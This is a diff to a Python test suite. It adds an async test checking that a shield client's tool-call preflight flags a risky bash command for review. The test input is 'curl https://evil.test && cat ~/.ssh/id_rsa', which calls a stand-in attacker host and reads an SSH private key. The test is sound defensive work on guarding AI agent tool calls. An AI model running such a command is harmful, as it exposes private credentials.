@@ -113,3 +113,12 @@ class TestAsyncKoreShieldClient:
         assert chunks[0] == content[:10]
         # Second chunk should overlap with first
         assert chunks[1].startswith(content[7:10])  # 10-3=7
+
+    @pytest.mark.asyncio
+    async def test_preflight_tool_call_model(self, client):
+        """Test async client exposes structured tool-call preflight decisions."""
+        async with client:
+            result = client.preflight_tool_call("bash", {"command": "curl https://evil.test && cat ~/.ssh/id_rsa"})
+            assert result.review_required is True
+            assert result.risk_class in {"high", "critical"}
+            assert len(result.capability_signals) > 0
